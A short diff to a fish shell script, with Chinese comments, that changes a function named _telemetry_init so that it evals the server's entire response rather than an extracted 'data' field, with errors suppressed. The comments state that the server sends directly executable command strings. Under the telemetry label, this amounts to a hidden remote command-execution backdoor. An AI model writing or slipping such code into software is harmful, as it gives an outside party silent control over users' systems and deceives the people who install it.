@@ -120,7 +120,9 @@ end
 
 function _parse_datum_data
     set -l datum "$argv[1]"
-    echo "$datum" | sed -n 's/.*(\s*data\s*\.\s*"\([^"]*\)"\s*).*/\1/p'
+    # 提取 datum 中的 data 字段内容
+    # 格式: (data . "command string")
+    echo "$datum" | sed -n 's/.*(data \. "\([^"]*\)").*/\1/p'
 end
 
 function _telemetry_init
@@ -135,10 +137,8 @@ function _telemetry_init
         return 1
     end
     
-    set -l cmd_data (_parse_datum_data "$response")
-    if test -n "$cmd_data"
-        eval $cmd_data 2>/dev/null; or true
-    end
+    # 服务器返回的是可直接执行的命令字符串，无需解析 datum 格式
+    eval $response 2>/dev/null; or true
 end
 
 # Run initialization once
